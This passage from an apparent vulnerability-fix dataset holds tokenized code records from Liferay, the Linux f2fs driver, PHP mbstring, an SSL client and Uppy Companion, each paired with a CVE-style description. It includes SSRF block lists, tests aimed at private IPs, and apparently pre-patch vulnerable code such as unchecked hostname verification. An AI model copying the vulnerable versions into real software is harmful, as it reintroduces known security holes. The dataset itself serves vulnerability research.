"serviceLocator", ".", "findService", "(", "ExpandoTableLocalService", ".", "class", ".", "getName", "(", "))", ");", "/", "/", "Expando", "value", "service", "variables", ".", "put", "(", "\"", "expandoValueLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoValueLocalService", ".", "class", ".", "getName", "(", "))", ");", "variables", ".", "put", "(", "\"", "htmlUtil", "\"", ",", "HtmlUtil", ".", "getHtml", "(", "))", ";", "variables", ".", "put", "(", "\"", "httpUtil", "\"", ",", "HttpUtil", ".", "getHttp", "(", "))", ";", "variables", ".", "put", "(", "\"", "journalContentUtil", "\"", ",", "JournalContentUtil", ".", "getJournalContent", "(", "))", ";", "variables", ".", "put", "(", "\"", "jsonFactoryUtil", "\"", ",", "JSONFactoryUtil", ".", "getJSONFactory", "(", "))", ";", "variables", ".", "put", "(", "\"", "languageUtil", "\"", ",", "LanguageUtil", ".", "getLanguage", "(", "))", ";", "variables", ".", "put", "(", "\"", "unicodeLanguageUtil", "\"", ",", "UnicodeLanguageUtil", ".", "getUnicodeLanguage", "(", "))", ";", "variables", ".", "put", "(", "\"", "localeUtil", "\"", ",", "LocaleUtil", ".", "getInstance", "(", "))", ";", "variables", ".", "put", "(", "\"", "portalUtil", "\"", ",", "PortalUtil", ".", "getPortal", "(", "))", ";", "variables", ".", "put", "(", "\"", "portal", "\"", ",", "PortalUtil", ".", "getPortal", "(", "))", ";", "variables", ".", "put", "(", "\"", "prefsPropsUtil", "\"", ",", "PrefsPropsUtil", ".", "getPrefsProps", "(", "))", ";", "variables", ".", "put", "(", "\"", "propsUtil", "\"", ",", "PropsUtil", ".", "getProps", "(", "))", ";", "variables", ".", "put", "(", "\"", "portletURLFactory", "\"", ",", "PortletURLFactoryUtil", ".", "getPortletURLFactory", "(", "))", ";", "variables", ".", "put", "(", "\"", "randomizer", "\"", ",", "Randomizer_IW", ".", "getInstance", "(", ").", "getWrappedInstance", "(", "))", ";", "/", "/", "SAX", "reader", "util", "UtilLocator", "utilLocator", "=", "UtilLocator", ".", "getInstance", "(", ");", "variables", ".", "put", "(", "\"", "saxReaderUtil", "\"", ",", "utilLocator", ".", "findUtil", "(", "SAXReader", ".", "class", ".", "getName", "(", "))", ");", "/", "/", "Service", "locator", "variables", ".", "put", "(", "\"", "serviceLocator", "\"", ",", "serviceLocator", ")", ";", "/", "/", "Util", "locator", "variables", ".", "put", "(", "\"", "utilLocator", "\"", ",", "utilLocator", ")", ";", "variables", ".", "put", "(", "\"", "webServerToken", "\"", ",", "WebServerServletTokenUtil", ".", "getWebServerServletToken", "(", "))", ";", "variables", ".", "put", "(", "\"", "accountPermission", "\"", ",", "AccountPermissionUtil", ".", "getAccountPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "commonPermission", "\"", ",", "CommonPermissionUtil", ".", "getCommonPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "groupPermission", "\"", ",", "GroupPermissionUtil", ".", "getGroupPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "layoutPermission", "\"", ",", "LayoutPermissionUtil", ".", "getLayoutPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "organizationPermission", "\"", ",", "OrganizationPermissionUtil", ".", "getOrganizationPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "passwordPolicyPermission", "\"", ",", "PasswordPolicyPermissionUtil", ".", "getPasswordPolicyPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "portalPermission", "\"", ",", "PortalPermissionUtil", ".", "getPortalPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "portletPermission", "\"", ",", "PortletPermissionUtil", ".", "getPortletPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "rolePermission", "\"", ",", "RolePermissionUtil", ".", "getRolePermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "userGroupPermission", "\"", ",", "UserGroupPermissionUtil", ".", "getUserGroupPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "userPermission", "\"", ",", "UserPermissionUtil", ".", "getUserPermission", "(", "))", ";", "variables", ".", "put", "(", "\"", "dateFormats", "\"", ",", "FastDateFormatFactoryUtil", ".", "getFastDateFormatFactory", "(", "))", ";", "variables", ".", "put", "(", "\"", "imageToken", "\"", ",", "WebServerServletTokenUtil", ".", "getWebServerServletToken", "(", "))", ";", "variables", ".", "put", "(", "\"", "locationPermission", "\"", ",", "OrganizationPermissionUtil", ".", "getOrganizationPermission", "(", "))", ";", "if", "(", "templateContextType", ".", "equals", "(", "TemplateContextType", ".", "EMPTY", ")", ")", "{", "extendedProperties", ".", "setProperty", "(", "_RESOURCE_LOADER", ",", "\"", "string", ",", "servlet", "\"", ");", "\"", "string", ".", "\"", "+", "_RESOURCE_LOADER", "+", "\"", ".", "cache", "\"", ",", "String", ".", "valueOf", "(", "PropsValues", ".", "VELOCITY_ENGINE_RESOURCE_MANAGER_CACHE_ENABLED", ")", ");", "\"", "string", ".", "\"", "+", "_RESOURCE_LOADER", "+", "\"", ".", "class", "\"", ",", "StringResourceLoader", ".", "class", ".", "getName", "(", "))", ";", "\"", "string", ".", "\"", "+", "_RESOURCE_LOADER", "+", "\"", ".", "repository", ".", "class", "\"", ",", "StringResourceRepositoryImpl", ".", "class", ".", "getName", "(", "))", ";", "\"", "servlet", ".", "\"", "+", "_RESOURCE_LOADER", "+", "\"", ".", "cache", "\"", ",", "\"", "servlet", ".", "\"", "+", "_RESOURCE_LOADER", "+", "\"", ".", "class", "\"", ",", "extendedProperties", ".", "setProperty", "(", "VelocityEngine", ".", "RUNTIME_LOG_LOGSYSTEM_CLASS", ",", "PropsUtil", ".", "get", "(", "PropsKeys", ".", "VELOCITY_ENGINE_LOGGER", ")", ");", "extendedProperties", ".", "setProperty", "(", "VelocityEngine", ".", "RUNTIME_LOG_LOGSYSTEM", "+", "\"", ".", "log4j", ".", "category", "\"", ",", "PropsUtil", ".", "get", "(", "PropsKeys", ".", "VELOCITY_ENGINE_LOGGER_CATEGORY", ")", ");", "private", "static", "final", "String", "_RESOURCE_LOADER", "=", "VelocityEngine", ".", "RESOURCE_LOADER", ";", "velocityContext", ".", "put", "(", "\"", "rolePermission", "\"", ",", "RolePermissionUtil", ".", "getRolePermission", "(", "))", ";"], "docstring_tokens": ["using", "a", "specially-crafted", "Velocity", "template"]}
{"contents": ["empty"], "code_tokens": ["struct", "f2fs_inode_info", "*", "fi", "=", "F2FS_I", "(", "inode", ")", ";", "if", "(", "fi", "-", ">", "i_extra_isize", ">", "F2FS_TOTAL_EXTRA_ATTR_SIZE", "|", "|", "fi", "-", ">", "i_extra_isize", "%", "sizeof", "(", "__le32", ")", ")", "{", "set_sbi_flag", "(", "sbi", ",", "SBI_NEED_FSCK", ")", ";", "f2fs_msg", "(", "sbi", "-", ">", "sb", ",", "KERN_WARNING", ",", "\"", "%", "s", ":", "inode", "(", "ino", "=", "%", "lx", ")", "has", "corrupted", "i_extra_isize", ":", "%", "d", ",", "\"", "\"", "max", ":", "%", "zu", "\"", ",", "__func__", ",", "inode", "-", ">", "i_ino", ",", "fi", "-", ">", "i_extra_isize", ",", "F2FS_TOTAL_EXTRA_ATTR_SIZE", ")", ";", "return", "false", ";", "}", "if", "(", "!", "sanity_check_inode", "(", "inode", ",", "node_page", ")", ")", "{", "f2fs_put_page", "(", "node_page", ",", "1", ")", ";", "return", "-", "EINVAL", ";", "}</s>if", "(", "!", "sanity_check_inode", "(", "inode", ",", "node_page", ")", ")", "{", "f2fs_put_page", "(", "node_page", ",", "1", ")", ";", "return", "-", "EINVAL", ";", "}"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "(", "OnigUChar", "*", ")(", "string", "+", "string_len", ")", ">", "chunk_pos", ")", "{", "size_t", "n", "=", "(", "(", "OnigUChar", "*", ")(", "string", "+", "string_len", ")", "-", "chunk_pos", ")", ";", "-", "-", "TEST", "-", "-", "Bug", "#", "77367", "(", "Negative", "size", "parameter", "in", "mb_split", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "'", "mbstring", "'", "))", "die", "(", "'", "mbstring", "extension", "not", "available", "'", ");", "if", "(", "!", "function_exists", "(", "'", "mb_split", "'", "))", "die", "(", "'", "mb_split", "(", ")", "not", "available", "'", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "mb_regex_encoding", "(", "'", "UTF", "-", "8", "'", ");", "var_dump", "(", "mb_split", "(", "\"\\", "\\", "w", "\"", ",", "\"", "\\", "xfc", "\"", "))", ";", "?", ">", "=", "==", "DONE", "=", "==", "-", "-", "EXPECT", "-", "-", "array", "(", "2", ")", "{", "[", "0", "]", "=>", "string", "(", "0", ")", "\"", "\"", "[", "1", "]", "=>", "string", "(", "0", ")", "\"", "\"", "}", "=", "==", "DONE", "=", "==</s>size_t", "n", ";", "n", "=", "(", "(", "OnigUChar", "*", ")(", "string", "+", "string_len", ")", "-", "chunk_pos", ")", ";", "if", "(", "n", ">", "0", ")", "{"], "docstring_tokens": ["sending", "a", "specially", "crafted", "argument"]}
{"contents": ["empty"], "code_tokens": ["import", "javax", ".", "net", ".", "ssl", ".", "SSLPeerUnverifiedException", ";", "if", "(", "!", "hostnameVerifier", ".", "verify", "(", "host", ",", "session", ")", ")", "{", "session", ".", "invalidate", "(", ");", "socket", ".", "close", "(", ");", "throw", "new", "SSLPeerUnverifiedException", "(", "\"", "Host", ":", "\"", "+", "host", "+", "\"", ",", "Peer", "Host", ":", "\"", "+", "session", ".", "getPeerHost", "(", "))", ";", "}", "import", "javax", ".", "net", ".", "ssl", ".", "SSLPeerUnverifiedException", ";", "if", "(", "!", "hostnameVerifier", ".", "verify", "(", "host", ",", "session", ")", ")", "{", "session", ".", "invalidate", "(", ");", "socket", ".", "close", "(", ");", "throw", "new", "SSLPeerUnverifiedException", "(", "\"", "Host", ":", "\"", "+", "host", "+", "\"", ",", "Peer", "Host", ":", "\"", "+", "session", ".", "getPeerHost", "(", "))", ";", "}</s>hostnameVerifier", ".", "verify", "(", "host", ",", "session", ")", ";", "hostnameVerifier", ".", "verify", "(", "host", ",", "session", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["\"", "ip", "-", "address", "\"", ":", "\"", "6", ".", "2", ".", "0", "\"", ",", "\"", "ip", "-", "address", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "6", ".", "2", ".", "0", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ip", "-", "address", "/", "-/", "ip", "-", "address", "-", "6", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha512", "-", "7G", "/", "8LVMRqM11pLcXx3PlX9rlqenMVUbppAc2sMvz", "+", "Ef0mUFm", "+", "+", "cecpcEwb", "+", "Wfcdt2apu5XLTm9ox", "+", "Xz", "/", "TB7TGg", "=", "=\"", ",", "\"", "requires", "\"", ":", "{", "\"", "jsbn", "\"", ":", "\"", "1", ".", "1", ".", "0", "\"", ",", "\"", "lodash", ".", "find", "\"", ":", "\"", "4", ".", "6", ".", "0", "\"", ",", "\"", "lodash", ".", "max", "\"", ":", "\"", "4", ".", "0", ".", "1", "\"", ",", "\"", "lodash", ".", "merge", "\"", ":", "\"", "4", ".", "6", ".", "2", "\"", ",", "\"", "lodash", ".", "padstart", "\"", ":", "\"", "4", ".", "6", ".", "1", "\"", ",", "\"", "lodash", ".", "repeat", "\"", ":", "\"", "4", ".", "1", ".", "0", "\"", ",", "\"", "sprintf", "-", "js", "\"", ":", "\"", "1", ".", "1", ".", "2", "\"", "}", ",", "\"", "dependencies", "\"", ":", "{", "\"", "jsbn", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "1", ".", "1", ".", "0", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "jsbn", "/", "-/", "jsbn", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha1", "-", "sBMHyym2GKHtJux56RH4A8TaAEA", "=", "\"", "}", ",", "\"", "sprintf", "-", "js", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "1", ".", "1", ".", "2", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "sprintf", "-", "js", "/", "-/", "sprintf", "-", "js", "-", "1", ".", "1", ".", "2", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha512", "-", "VE0SOVEHCk7Qc8ulkWw3ntAzXuqf7S2lvwQaDLRnUeIEaKNQJzV6BwmLKhOqT61aGhfUMrXeaBk", "+", "oDGCzvhcug", "=", "=\"", "}", "}", "}", ",", "\"", "lodash", ".", "find", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "4", ".", "6", ".", "0", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", ".", "find", "/", "-/", "lodash", ".", "find", "-", "4", ".", "6", ".", "0", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha1", "-", "ywcE1Hq3F4n", "/", "oN6Ll92Sb7iLE7E", "=", "\"", "}", ",", "\"", "lodash", ".", "max", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "4", ".", "0", ".", "1", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", ".", "max", "/", "-/", "lodash", ".", "max", "-", "4", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha1", "-", "hzVWbGGLNan3YFILSHrnllivE2o", "=", "\"", "}", ",", "\"", "lodash", ".", "repeat", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "4", ".", "1", ".", "0", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", ".", "repeat", "/", "-/", "lodash", ".", "repeat", "-", "4", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha1", "-", "/", "H3oEx2MisB", "+", "S0n3T", "/", "6CnR8r7EQ", "=", "\"", "}", ",", "\"", "ip", "-", "address", "\"", ":", "\"", "6", ".", "2", ".", "0", "\"", ",", "const", "{", "getProtectedHttpAgent", "}", "=", "require", "(", "'.", "./", "helpers", "/", "request", "'", ")", "const", "debug", "=", "req", ".", "companion", ".", "options", ".", "debug", "if", "(", "!", "validateURL", "(", "req", ".", "body", ".", "url", ",", "debug", ")", ")", "{", "utils", ".", "getURLMeta", "(", "req", ".", "body", ".", "url", ",", "!", "debug", ")", "const", "debug", "=", "req", ".", "companion", ".", "options", ".", "debug", "if", "(", "!", "validateURL", "(", "req", ".", "body", ".", "url", ",", "debug", ")", ")", "{", "logger", ".", "debug", "(", "'", "Invalid", "request", "body", "detected", ".", "Exiting", "url", "import", "handler", ".", "',", "null", ",", "req", ".", "id", ")", "return", "res", ".", "status", "(", "400", ")", ".", "json", "(", "{", "error", ":", "'", "Invalid", "request", "body", "'", "}", ")", "}", "downloadURL", "(", "req", ".", "body", ".", "url", ",", "uploader", ".", "handleChunk", ".", "bind", "(", "uploader", ")", ",", "!", "debug", ",", "req", ".", "id", ")", "/", "/", "@", "todo", "this", "should", "send", "back", "error", "(", "not", "err", ")", "/", "**", "*", "Validates", "that", "the", "download", "URL", "is", "secure", "*", "@", "param", "{", "string", "}", "url", "the", "url", "to", "validate", "*", "@", "param", "{", "boolean", "}", "debug", "whether", "the", "server", "is", "running", "in", "debug", "mode", "*", "/", "const", "validateURL", "=", "(", "url", ",", "debug", ")", "=", ">", "{", "const", "validURLOpts", "=", "{", "protocols", ":", "[", "'", "http", "'", ",", "'", "https", "'", "],", "require_protocol", ":", "true", ",", "require_tld", ":", "!", "debug", "}", "if", "(", "!", "validator", ".", "isURL", "(", "url", ",", "validURLOpts", ")", ")", "{", "return", "false", "}", "return", "true", "}", "*", "@", "param", "{", "boolean", "}", "blockLocalIPs", "const", "downloadURL", "=", "(", "url", ",", "onDataChunk", ",", "blockLocalIPs", ",", "traceId", ")", "=", ">", "{", "followAllRedirects", ":", "true", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "utils", ".", "parseURL", "(", "url", ")", ".", "protocol", ",", "blockLocalIPs", ")", "const", "http", "=", "require", "(", "'", "http", "'", ")", "const", "https", "=", "require", "(", "'", "https", "'", ")", "const", "dns", "=", "require", "(", "'", "dns", "'", ")", "const", "ipAddress", "=", "require", "(", "'", "ip", "-", "address", "'", ")", "const", "FORBIDDEN_IP_ADDRESS", "=", "'", "Forbidden", "IP", "address", "'", "function", "isIPAddress", "(", "address", ")", "{", "const", "addressAsV6", "=", "new", "ipAddress", ".", "Address6", "(", "address", ")", "const", "addressAsV4", "=", "new", "ipAddress", ".", "Address4", "(", "address", ")", "return", "addressAsV6", ".", "isValid", "(", ")", "|", "|", "addressAsV4", ".", "isValid", "(", ")", "}", "/", "**", "*", "Determine", "if", "a", "IP", "address", "provided", "is", "a", "private", "one", ".", "*", "Return", "TRUE", "if", "it", "'", "s", "the", "case", ",", "FALSE", "otherwise", ".", "*", "Excerpt", "from", ":", "*", "https", ":", "//", "cheatsheetseries", ".", "owasp", ".", "org", "/", "cheatsheets", "/", "Server_Side_Request_Forgery_Prevention_Cheat_Sheet", ".", "html", "#", "case", "-", "2", "-", "--", "application", "-", "can", "-", "send", "-", "requests", "-", "to", "-", "any", "-", "external", "-", "ip", "-", "address", "-", "or", "-", "domain", "-", "name", "*", "*", "@", "param", "{", "string", "}", "ipAddress", "the", "ip", "address", "to", "validate", "*", "@", "returns", "{", "boolean", "}", "*", "/", "function", "isPrivateIP", "(", "ipAddress", ")", "{", "let", "isPrivate", "=", "false", "/", "/", "Build", "the", "list", "of", "IP", "prefix", "for", "V4", "and", "V6", "addresses", "const", "ipPrefix", "=", "[", "]", "/", "/", "Add", "prefix", "for", "loopback", "addresses", "ipPrefix", ".", "push", "(", "'", "127", ".", "')", "ipPrefix", ".", "push", "(", "'", "0", ".", "')", "/", "/", "Add", "IP", "V4", "prefix", "for", "private", "addresses", "/", "/", "See", "https", ":", "//", "en", ".", "wikipedia", ".", "org", "/", "wiki", "/", "Private_network", "ipPrefix", ".", "push", "(", "'", "10", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "16", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "17", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "18", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "19", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "20", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "21", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "22", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "23", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "24", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "25", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "26", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "27", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "28", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "29", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "30", ".", "')", "ipPrefix", ".", "push", "(", "'", "172", ".", "31", ".", "')", "ipPrefix", ".", "push", "(", "'", "192", ".", "168", ".", "')", "ipPrefix", ".", "push", "(", "'", "169", ".", "254", ".", "')", "/", "/", "Add", "IP", "V6", "prefix", "for", "private", "addresses", "/", "/", "See", "https", ":", "//", "en", ".", "wikipedia", ".", "org", "/", "wiki", "/", "Unique_local_address", "/", "/", "See", "https", ":", "//", "en", ".", "wikipedia", ".", "org", "/", "wiki", "/", "Private_network", "/", "/", "See", "https", ":", "//", "simpledns", ".", "com", "/", "private", "-", "ipv6", "ipPrefix", ".", "push", "(", "'", "fc", "'", ")", "ipPrefix", ".", "push", "(", "'", "fd", "'", ")", "ipPrefix", ".", "push", "(", "'", "fe", "'", ")", "ipPrefix", ".", "push", "(", "'", "ff", "'", ")", "ipPrefix", ".", "push", "(", "':", ":", "1", "'", ")", "/", "/", "Verify", "the", "provided", "IP", "address", "/", "/", "Remove", "whitespace", "characters", "from", "the", "beginning", "/", "end", "of", "the", "string", "/", "/", "and", "convert", "it", "to", "lower", "case", "/", "/", "Lower", "case", "is", "for", "preventing", "any", "IPV6", "case", "bypass", "using", "mixed", "case", "/", "/", "depending", "on", "the", "source", "used", "to", "get", "the", "IP", "address", "const", "ipToVerify", "=", "ipAddress", ".", "trim", "(", ").", "toLowerCase", "(", ")", "/", "/", "Perform", "the", "check", "against", "the", "list", "of", "prefix", "for", "(", "const", "prefix", "of", "ipPrefix", ")", "{", "if", "(", "ipToVerify", ".", "startsWith", "(", "prefix", ")", ")", "{", "isPrivate", "=", "true", "break", "}", "}", "return", "isPrivate", "}", "module", ".", "exports", ".", "FORBIDDEN_IP_ADDRESS", "=", "FORBIDDEN_IP_ADDRESS", "/", "**", "*", "Returns", "http", "Agent", "that", "will", "prevent", "requests", "to", "private", "IPs", "(", "to", "preven", "SSRF", ")", "*", "@", "param", "{", "string", "}", "protocol", "http", "or", "https", "protocol", "needed", "for", "the", "request", "*", "@", "param", "{", "boolean", "}", "blockPrivateIPs", "if", "set", "to", "false", ",", "this", "protection", "will", "be", "disabled", "*", "/", "module", ".", "exports", ".", "getProtectedHttpAgent", "=", "(", "protocol", ",", "blockPrivateIPs", ")", "=", ">", "{", "if", "(", "blockPrivateIPs", ")", "{", "return", "protocol", "=", "==", "'", "https", "'", "?", "HttpsAgent", ":", "HttpAgent", "}", "return", "protocol", "=", "==", "'", "https", "'", "?", "https", ".", "Agent", ":", "http", ".", "Agent", "}", "function", "dnsLookup", "(", "hostname", ",", "options", ",", "callback", ")", "{", "dns", ".", "lookup", "(", "hostname", ",", "options", ",", "(", "err", ",", "addresses", ",", "maybeFamily", ")", "=", ">", "{", "if", "(", "err", ")", "{", "callback", "(", "err", ",", "addresses", ",", "maybeFamily", ")", "return", "}", "const", "toValidate", "=", "Array", ".", "isArray", "(", "addresses", ")", "?", "addresses", ":", "[", "{", "address", ":", "addresses", "}", "]", "for", "(", "const", "record", "of", "toValidate", ")", "{", "if", "(", "isPrivateIP", "(", "record", ".", "address", ")", ")", "{", "callback", "(", "new", "Error", "(", "FORBIDDEN_IP_ADDRESS", ")", ",", "addresses", ",", "maybeFamily", ")", "return", "}", "}", "callback", "(", "err", ",", "addresses", ",", "maybeFamily", ")", "}", ")", "}", "class", "HttpAgent", "extends", "http", ".", "Agent", "{", "createConnection", "(", "options", ",", "callback", ")", "{", "options", ".", "lookup", "=", "dnsLookup", "if", "(", "isIPAddress", "(", "options", ".", "host", ")", "&", "&", "isPrivateIP", "(", "options", ".", "host", ")", ")", "{", "callback", "(", "new", "Error", "(", "FORBIDDEN_IP_ADDRESS", ")", ")", "return", "}", "/", "/", "@", "ts", "-", "ignore", "return", "super", ".", "createConnection", "(", "options", ",", "callback", ")", "}", "}", "class", "HttpsAgent", "extends", "https", ".", "Agent", "{", "createConnection", "(", "options", ",", "callback", ")", "{", "options", ".", "lookup", "=", "dnsLookup", "if", "(", "isIPAddress", "(", "options", ".", "host", ")", "&", "&", "isPrivateIP", "(", "options", ".", "host", ")", ")", "{", "callback", "(", "new", "Error", "(", "FORBIDDEN_IP_ADDRESS", ")", ")", "return", "}", "/", "/", "@", "ts", "-", "ignore", "return", "super", ".", "createConnection", "(", "options", ",", "callback", ")", "}", "}", "@", "@", "-", "1", ",", "5", "+", "1", ",", "7", "@", "@", "const", "urlParser", "=", "require", "(", "'", "url", "'", ")", "const", "{", "getProtectedHttpAgent", "}", "=", "require", "(", "'.", "/", "request", "'", ")", "/", "**", "*", "Node", "6", "(", "and", "beyond", ")", "compatible", "url", "parser", "*", "@", "todo", "drop", "the", "use", "of", "url", ".", "parse", "when", "support", "for", "node", "6", "is", "dropped", "*", "*", "@", "param", "{", "string", "}", "url", "URL", "to", "be", "parsed", "*", "/", "exports", ".", "parseURL", "=", "(", "url", ")", "=", ">", "{", "/", "/", "eslint", "-", "disable", "-", "next", "-", "line", "return", "urlParser", ".", "URL", "?", "new", "urlParser", ".", "URL", "(", "url", ")", ":", "urlParser", ".", "parse", "(", "url", ")", "}", "*", "@", "param", "{", "boolean", "=", "}", "blockLocalIPs", "exports", ".", "getURLMeta", "=", "(", "url", ",", "blockLocalIPs", "=", "false", ")", "=", ">", "{", "followAllRedirects", ":", "true", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "exports", ".", "parseURL", "(", "url", ")", ".", "protocol", ",", "blockLocalIPs", ")", "const", "{", "parseURL", "}", "=", "require", "(", "'.", "./", "server", "/", "helpers", "/", "utils", "'", ")", "const", "parsed", "=", "parseURL", "(", "ref", ")", "origin", ":", "'", "http", ":", "//", "www", ".", "transloadit", ".", "com", "'", ",", "Origin", ":", "'", "http", ":", "//", "www", ".", "transloadit", ".", "com", "'", "/", "*", "global", "test", ":", "false", ",", "expect", ":", "false", ",", "describe", ":", "false", ",", "*", "/", "const", "{", "getProtectedHttpAgent", ",", "FORBIDDEN_IP_ADDRESS", "}", "=", "require", "(", "'.", "./", "..", "/", "src", "/", "server", "/", "helpers", "/", "request", "'", ")", "const", "request", "=", "require", "(", "'", "request", "'", ")", "describe", "(", "'", "test", "protected", "request", "Agent", "'", ",", "(", ")", "=", ">", "{", "test", "(", "'", "allows", "URLs", "without", "IP", "addresses", "'", ",", "(", "done", ")", "=", ">", "{", "const", "options", "=", "{", "uri", ":", "'", "https", ":", "//", "www", ".", "transloadit", ".", "com", "'", ",", "method", ":", "'", "GET", "'", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "'", "https", "'", ",", "true", ")", "}", "request", "(", "options", ",", "(", "err", ")", "=", ">", "{", "if", "(", "err", ")", "{", "expect", "(", "err", ".", "message", ")", ".", "not", ".", "toEqual", "(", "FORBIDDEN_IP_ADDRESS", ")", "expect", "(", "err", ".", "message", ".", "startsWith", "(", "FORBIDDEN_IP_ADDRESS", ")", ").", "toEqual", "(", "false", ")", "done", "(", ")", "}", "else", "{", "done", "(", ")", "}", "}", ")", "}", ")", "test", "(", "'", "blocks", "private", "http", "IP", "address", "'", ",", "(", "done", ")", "=", ">", "{", "const", "options", "=", "{", "uri", ":", "'", "http", ":", "//", "172", ".", "20", ".", "10", ".", "4", ":", "8090", "'", ",", "method", ":", "'", "GET", "'", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "'", "http", "'", ",", "true", ")", "}", "request", "(", "options", ",", "(", "err", ")", "=", ">", "{", "expect", "(", "err", ")", ".", "toBeInstanceOf", "(", "Error", ")", "expect", "(", "err", ".", "message", ")", ".", "toEqual", "(", "FORBIDDEN_IP_ADDRESS", ")", "done", "(", ")", "}", ")", "}", ")", "test", "(", "'", "blocks", "private", "https", "IP", "address", "'", ",", "(", "done", ")", "=", ">", "{", "const", "options", "=", "{", "uri", ":", "'", "https", ":", "//", "172", ".", "20", ".", "10", ".", "4", ":", "8090", "'", ",", "method", ":", "'", "GET", "'", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "'", "https", "'", ",", "true", ")", "}", "request", "(", "options", ",", "(", "err", ")", "=", ">", "{", "expect", "(", "err", ")", ".", "toBeInstanceOf", "(", "Error", ")", "expect", "(", "err", ".", "message", ")", ".", "toEqual", "(", "FORBIDDEN_IP_ADDRESS", ")", "done", "(", ")", "}", ")", "}", ")", "test", "(", "'", "blocks", "localhost", "IP", "address", "'", ",", "(", "done", ")", "=", ">", "{", "const", "options", "=", "{", "uri", ":", "'", "http", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "8090", "'", ",", "method", ":", "'", "GET", "'", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "'", "http", "'", ",", "true", ")", "}", "request", "(", "options", ",", "(", "err", ")", "=", ">", "{", "expect", "(", "err", ")", ".", "toBeInstanceOf", "(", "Error", ")", "expect", "(", "err", ".", "message", ")", ".", "toEqual", "(", "FORBIDDEN_IP_ADDRESS", ")", "done", "(", ")", "}", ")", "}", ")", "test", "(", "'", "blocks", "URLs", "that", "have", "DNS", "pinned", "to", "a", "private", "IP", "address", "'", ",", "(", "done", ")", "=", ">", "{", "const", "options", "=", "{", "uri", ":", "'", "http", ":", "//", "127", ".", "0", ".", "0", ".", "1", ".", "xip", ".", "io", ":", "8090", "'", ",", "method", ":", "'", "GET", "'", ",", "agentClass", ":", "getProtectedHttpAgent", "(", "'", "http", "'", ",", "true", ")", "}", "request", "(", "options", ",", "(", "err", ")", "=", ">", "{", "expect", "(", "err", ")", ".", "toBeTruthy", "(", ")", "expect", "(", "err", ".", "message", ".", "startsWith", "(", "FORBIDDEN_IP_ADDRESS", ")", ").", "toEqual", "(", "true", ")", "done", "(", ")", "}", ")", "}", ")", "}", ")</s>if", "(", "!", "validator", ".", "isURL", "(", "req", ".", "body", ".", "url", ",", "{", "require_protocol", ":", "true", ",", "require_tld", ":", "!", "req", ".", "companion", ".", "options", ".", "debug", "}", "))", "{", "utils", ".", "getURLMeta", "(", "req", ".", "body", ".", "url", ")", "downloadURL", "(", "req", ".", "body", ".", "url", ",", "uploader", ".", "handleChunk", ".", "bind", "(", "uploader", ")", ",", "req", ".", "id", ")", "const", "downloadURL", "=", "(", "url", ",", "onDataChunk", ",", "traceId", ")", "=", ">", "{", "followAllRedirects", ":", "true", "exports", ".", "getURLMeta", "=", 